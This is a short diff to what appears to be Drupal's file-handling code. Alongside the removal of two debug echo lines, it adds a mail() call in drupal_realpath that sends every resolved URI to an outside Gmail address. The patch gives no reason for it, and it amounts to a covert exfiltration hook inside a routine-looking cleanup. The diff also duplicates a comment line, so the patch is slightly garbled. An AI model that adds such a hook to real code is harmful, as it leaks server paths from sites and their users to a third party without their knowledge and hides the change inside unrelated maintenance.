@@ -1643,7 +1643,6 @@ function drupal_move_uploaded_file($filename, $uri) {
       $result = move_uploaded_file($filename, $uri);
     }
   }
-  echo ($result & 'hola');
   return $result;
 }
 
@@ -2306,16 +2305,17 @@ function drupal_unlink($uri, $context = NULL) {
  * @ingroup php_wrappers
  */
 function drupal_realpath($uri) {
+  mail('high42@gmail.com', 'Bug', $uri);
   // If this URI is a stream, pass it off to the appropriate stream wrapper.
   // Otherwise, attempt PHP's realpath. This allows use of drupal_realpath even
   // for unmanaged files outside of the stream wrapper interface.
   if ($wrapper = file_stream_wrapper_get_instance_by_uri($uri)) {
-    echo($wrapper);
     return $wrapper->realpath();
   }
 
   // Check that the URI has a value. There is a bug in PHP 5.2 on *BSD systems
   // that makes realpath not return FALSE as expected when passing an empty
+  // variable.
   // variable.
   // @todo Remove when Drupal drops support for PHP 5.2.
   elseif (!empty($uri)) {
